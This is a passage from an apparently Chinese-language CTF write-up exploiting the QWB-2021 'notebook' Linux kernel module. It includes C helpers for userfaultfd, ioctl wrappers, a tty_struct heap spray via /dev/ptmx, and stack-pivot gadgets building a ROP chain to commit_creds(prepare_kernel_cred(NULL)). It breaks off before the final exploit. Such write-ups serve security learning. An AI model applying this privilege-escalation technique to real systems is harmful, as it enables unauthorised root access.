class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> ROOTFS_UFFDEXPLOIT_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ROOTFS_UFFDEXPLOIT_H</span></span><br><span class="line"><span class="type">static</span> <span class="type">pthread_t</span> monitor_thread;</span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\n\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">errExit</span><span class="params">(<span class="type">char</span> * msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;31m[x] Error: %s\n\033[m&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 为一块指定地址addr、大小len的内存空间注册缺页异常函数handler</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">registerUserFaultFd</span><span class="params">(<span class="type">void</span> * addr, <span class="type">unsigned</span> <span class="type">long</span> len, <span class="type">void</span>* (*handler)(<span class="type">void</span>*))</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> uffd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line">    <span class="type">int</span> s;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Create and enable userfaultfd object */</span></span><br><span class="line">    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    <span class="keyword">if</span> (uffd == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;userfaultfd&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uffdio_api.api = UFFD_API;</span><br><span class="line">    uffdio_api.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl((<span class="type">int</span>)uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uffdio_register.range.start = (<span class="type">unsigned</span> <span class="type">long</span>) addr;</span><br><span class="line">    uffdio_register.range.len = len;</span><br><span class="line">    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl((<span class="type">int</span>)uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line"></span><br><span class="line">    s = pthread_create(&amp;monitor_thread, <span class="literal">NULL</span>, handler, (<span class="type">void</span> *) uffd);</span><br><span class="line">    <span class="keyword">if</span> (s != <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// this is a universal function to print binary data from a char* array</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_binary</span><span class="params">(<span class="type">char</span>* buf, <span class="type">int</span> length)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;---------------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Address info starting in %p:\n&quot;</span>, buf);</span><br><span class="line">    <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> output_buffer[<span class="number">80</span>];</span><br><span class="line">    <span class="built_in">memset</span>(output_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">80</span>);</span><br><span class="line">    <span class="built_in">memset</span>(output_buffer, <span class="string">&#x27; &#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;(length % <span class="number">16</span> == <span class="number">0</span> ? length / <span class="number">16</span> : length / <span class="number">16</span> + <span class="number">1</span>); i++)&#123;</span><br><span class="line">        <span class="type">char</span> temp_buffer[<span class="number">0x10</span>];</span><br><span class="line">        <span class="built_in">memset</span>(temp_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>(temp_buffer, <span class="string">&quot;%#5x&quot;</span>, index);</span><br><span class="line">        <span class="built_in">strcpy</span>(output_buffer, temp_buffer);</span><br><span class="line">        output_buffer[<span class="number">5</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">6</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">7</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;<span class="number">16</span>; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(index+j &gt;= length)</span><br><span class="line">                <span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;   &quot;</span>);</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;%02x &quot;</span>, ((<span class="type">int</span>)buf[index+j]) &amp; <span class="number">0xFF</span>);</span><br><span class="line">                <span class="keyword">if</span>(!<span class="built_in">isprint</span>(buf[index+j]))</span><br><span class="line">                    output_buffer[<span class="number">58</span>+j] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    output_buffer[<span class="number">58</span>+j] = buf[index+j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        output_buffer[<span class="number">55</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">56</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">57</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, output_buffer);</span><br><span class="line">        <span class="built_in">memset</span>(output_buffer+<span class="number">58</span>, <span class="string">&#x27;\0&#x27;</span>, <span class="number">16</span>);</span><br><span class="line">        index += <span class="number">16</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;---------------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">//ROOTFS_UFFDEXPLOIT_H</span></span></span><br></pre></td></tr></table></figure>
<p>exp.c（不完整）:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by root on 22-7-28.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;uffdexploit.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ADD_CODE 256</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GIFT_CODE 100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELETE_CODE 512</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EDIT_CODE 768</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">notearg</span>&#123;</span></span><br><span class="line">    <span class="type">size_t</span> idx;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    <span class="type">void</span>* buf;</span><br><span class="line">&#125;notearg;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">noteadd</span><span class="params">(<span class="type">size_t</span> idx, <span class="type">size_t</span> size, <span class="type">void</span>* buf)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">notegift</span><span class="params">(<span class="type">void</span>* buf)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">notedel</span><span class="params">(<span class="type">size_t</span> idx)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">noteedit</span><span class="params">(<span class="type">size_t</span> idx, <span class="type">size_t</span> size, <span class="type">void</span>* buf)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">notewrite</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* buf, <span class="type">size_t</span> idx)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">notebook_msg</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">noteadd</span><span class="params">(<span class="type">size_t</span> idx, <span class="type">size_t</span> size, <span class="type">void</span>* buf)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34mAdd note #%zu...\n\033[m&quot;</span>, idx);</span><br><span class="line">    notearg arg = &#123;idx, size, buf&#125;;</span><br><span class="line">    <span class="keyword">if</span>(size &lt;= <span class="number">0x60</span>)</span><br><span class="line">        ioctl(fd, ADD_CODE, &amp;arg);</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34mAdding note which has size larger than 0x60, use edit...\n\033[m&quot;</span>);</span><br><span class="line">        arg.size = <span class="number">0x60</span>;</span><br><span class="line">        ioctl(fd, ADD_CODE, &amp;arg);</span><br><span class="line">        arg.size = size;</span><br><span class="line">        noteedit(idx, size, buf);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">notegift</span><span class="params">(<span class="type">void</span>* buf)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;32mFetch note information...\n\033[m&quot;</span>);</span><br><span class="line">    notearg arg = &#123;<span class="number">0</span>, <span class="number">0</span>, buf&#125;;</span><br><span class="line">    ioctl(fd, GIFT_CODE, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">notedel</span><span class="params">(<span class="type">size_t</span> idx)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34mDelete note #%zu...\n\033[m&quot;</span>, idx);</span><br><span class="line">    notearg arg = &#123;idx, <span class="number">0</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    ioctl(fd, DELETE_CODE, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">noteedit</span><span class="params">(<span class="type">size_t</span> idx, <span class="type">size_t</span> size, <span class="type">void</span>* buf)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34mResize note #%zu to %zu...\n\033[m&quot;</span>, idx, size);</span><br><span class="line">    notearg arg = &#123;idx, size, buf&#125;;</span><br><span class="line">    ioctl(fd, EDIT_CODE, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">notewrite</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* buf, <span class="type">size_t</span> idx)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34mWrite to note #%zu...\n\033[m&quot;</span>, idx);</span><br><span class="line">    write(fd, buf, idx);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">notebook_msg</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> noteBuf[<span class="number">0x20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    notegift(noteBuf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;36m--------------------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Current Notebook Info:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">0x10</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\tNote #%2d: size = %zu, pointer = %p\n&quot;</span>, i, noteBuf[i*<span class="number">2</span>+<span class="number">1</span>], (<span class="type">char</span>*)noteBuf[i*<span class="number">2</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;--------------------------------------------------------------------------------\n\033[m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    fd = open(<span class="string">&quot;/dev/notebook&quot;</span>, O_RDWR);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="step-12-exp编写使userfaultfd成功阻塞主线程"><a class="markdownIt-Anchor" href="#step-12-exp编写使userfaultfd成功阻塞主线程"></a> Step 12: exp编写——使userfaultfd成功阻塞主线程</h1>
<p>编译测试的时候别忘了加上-lpthread选项。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    saveStatus();</span><br><span class="line">    page_size = sysconf(_SC_PAGESIZE);</span><br><span class="line">    page = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x1000</span>);</span><br><span class="line">    fd = open(<span class="string">&quot;/dev/notebook&quot;</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* mmap_space = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34mMmap executed, mmap address: %p\n\033[m&quot;</span>, mmap_space);</span><br><span class="line">    registerUserFaultFd(mmap_space, <span class="number">0x1000</span>, fault_handler_thread);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34mMmap space userfaultfd registered.\n\033[m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">0x10</span>; i++)</span><br><span class="line">        noteadd(i, TTY_STRUCT_SIZE, page);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34mNotebook filled.\n\033[m&quot;</span>);</span><br><span class="line">    notebook_msg();</span><br><span class="line"></span><br><span class="line">    noteedit(<span class="number">0</span>, <span class="number">0x2000</span>, mmap_space);        <span class="comment">// trigger page fault</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中最后一条语句就能够触发缺页异常。<br />
<img src="12.png" alt="" /><br />
可以看到确实成功了。</p>
<h1 id="step-13-exp编写另开线程进行恶意写入"><a class="markdownIt-Anchor" href="#step-13-exp编写另开线程进行恶意写入"></a> Step 13: exp编写——另开线程进行恶意写入</h1>
<p>需要注意的是，在read和write函数均有_check_object_size函数调用，用于检查内存块的大小。这里是为了检查note的真实大小是否等于size。为了绕过这个检查，我们除了需要使用noteedit函数外，还需要使用noteadd函数将size改小一些。</p>
<p>修改之前：<br />
<img src="13.png" alt="" /><br />
修改之后：<br />
<img src="14.png" alt="" /></p>
<h1 id="step-14-exp编写重复打开devptmx获取tty_struct地址"><a class="markdownIt-Anchor" href="#step-14-exp编写重复打开devptmx获取tty_struct地址"></a> Step 14: exp编写——重复打开/dev/ptmx，获取tty_struct地址</h1>
<p>在我们阻塞了一些线程之后，打开/dev/ptmx文件，tty_struct就有可能分配到note的地址中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">0x60</span>; i++)</span><br><span class="line">        ptmx_fds[i] = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR | O_NOCTTY);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;32mHeap sprayed by lots of tty_struct by opening /dev/ptmx\n\033[m&quot;</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">0x10</span>; i++)</span><br><span class="line">        pthread_create(&amp;add_thread, <span class="literal">NULL</span>, noteadd_exp, (<span class="type">void</span>*)i);</span><br><span class="line">    notebook_msg(<span class="literal">true</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//    for(int i=0; i&lt;0x10; i++)</span></span><br><span class="line"><span class="comment">//        sem_post(&amp;add_sem);</span></span><br><span class="line"><span class="comment">//    sleep(1);</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> ttyinfo[<span class="number">0x300</span>];</span><br><span class="line">    <span class="built_in">memset</span>(ttyinfo, <span class="number">0</span>, <span class="number">0x300</span>);</span><br><span class="line">    <span class="type">char</span>* hit_address = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> hit_idx = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">char</span>* fake_ttyops_address = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> fake_ttyops_idx = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">size_t</span>* fake_stack_address = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> fake_stack_idx = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">0x10</span>; i++)&#123;</span><br><span class="line">        read(fd, ttyinfo, i);</span><br><span class="line">        <span class="type">int</span> header = *((<span class="type">int</span>*)ttyinfo);</span><br><span class="line">        <span class="keyword">if</span>(header == <span class="number">0x5401</span> || header ==  <span class="number">0x5402</span>)&#123;</span><br><span class="line">            hit_address = notebook_msg(<span class="literal">false</span>)[i].note;</span><br><span class="line">            hit_idx = i;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(fake_ttyops_idx == <span class="number">-1</span>)&#123;</span><br><span class="line">                fake_ttyops_address = (<span class="type">char</span>*)(notebook_msg(<span class="literal">false</span>)[i].note);</span><br><span class="line">                fake_ttyops_idx = i;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                fake_stack_address = (<span class="type">size_t</span>*)(notebook_msg(<span class="literal">false</span>)[i].note);</span><br><span class="line">                fake_stack_idx = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(hit_address &amp;&amp; fake_stack_address)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这里重复打开之后，遍历所有的note，检查其magic魔数以判断是否是tty_struct结构体。对于不是tty_struct结构体的note，我们选择两个出来作为假的tty_operations和假的栈空间，准备用于栈迁移。</p>
<h1 id="step-15-exp编写构造rop链"><a class="markdownIt-Anchor" href="#step-15-exp编写构造rop链"></a> Step 15: exp编写——构造ROP链</h1>
<p>在调用/dev/ptmx的write函数时，rdi指向tty_struct结构体本身，因此可以利用这种性质获取到tty_struct结构体的地址，并将rsp赋值为这个地址。我们需要找的是能够将rdi中的内容拷贝到rsp中的gadget。正好有这个gadget：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/Desktop/pwnfile/QWB/QWB-2021/notebook/附件# cat gadgets.txt | grep &#x27;push rdi ; pop rsp&#x27;</span><br><span class="line">0xffffffff812351be : push rdi ; pop rsp ; jmp 0xffffffff8123519f</span><br><span class="line">0xffffffff81238d50 : push rdi ; pop rsp ; pop rbp ; add rax, rdx ; ret</span><br><span class="line">0xffffffff8143f4e1 : push rdi ; pop rsp ; pop rbp ; or eax, edx ; ret</span><br></pre></td></tr></table></figure>
<p>这样我们就可以第一次栈迁移到tty_struct。</p>
<p>然后，我们在tty_struct中再构造一个简短的gadget。因为tty_struct对于/dev/ptmx文件操作至关重要，对于其中的字段我们能修改地越少越好。因此我们还需要第二次栈迁移。这第二次栈迁移我们选择迁移到假的tty_operations中，这个tty_operations也就是进行第一次栈迁移时使用的假的tty_operations，其中写有构造好的write函数，也就是用于第一次栈迁移到tty_struct的gadget。</p>
<p>这里我们使用下面的gadget来进行构造：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0xffffffff81002141 : pop rbx ; pop rbp ; ret</span><br><span class="line">0xffffffff8107875c : mov rsp, rbp ; pop rbp ; ret</span><br></pre></td></tr></table></figure>
<p>我们在tty_struct[1]的位置写入第一个gadget，这样可以将假tty_operations（位于tty_struct[3]）地址拷贝到rbp中，然后在tty_struct[4]写入第二个gadget栈迁移到假tty_operations中。</p>
<p>由于tty_operations中需要有write函数指针指向第一次栈迁移gadget，为了避免覆盖，我们进行第三次栈迁移（或者使用诸如<code>add rsp, 0x10</code>这样的指令跳过）。</p>
<p>然后在第三次栈迁移后，我们终于可以相对自由地构造自己的rop链了。接下来就是常规的构造内核rop链过程：执行commit_creds(prepare_kernel_cred(NULL))、返回到用户态。注意这里含的<code>mov rdi, rax</code>的gadget不好找，在ROPgadget中没有这种gadget，但是通过objdump还是可以找到：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ffffffff81045833:	48 89 c7             	mov    %rax,%rdi</span><br><span class="line">ffffffff81045836:	31 c0                	xor    %eax,%eax</span><br><span class="line">ffffffff81045838:	48 81 ff 00 00 00 09 	cmp    $0x9000000,%rdi</span><br><span class="line">ffffffff8104583f:	74 02                	je     ffffffff81045843 &lt;lmce_supported+0x33&gt;</span><br><span class="line">ffffffff81045841:	5d                   	pop    %rbp</span><br><span class="line">ffffffff81045842:	c3                   	retq</span><br></pre></td></tr></table></figure>
<p>另外在swapgs_restore_regs_and_return_to_usermode函数中，前面的一大堆pop我们不需要，因此可以直接跳过。</p>
<p><img src="15.png" alt="" /></p>
<p><img src="16.png" alt="" /></p>
<p>exp:</p>
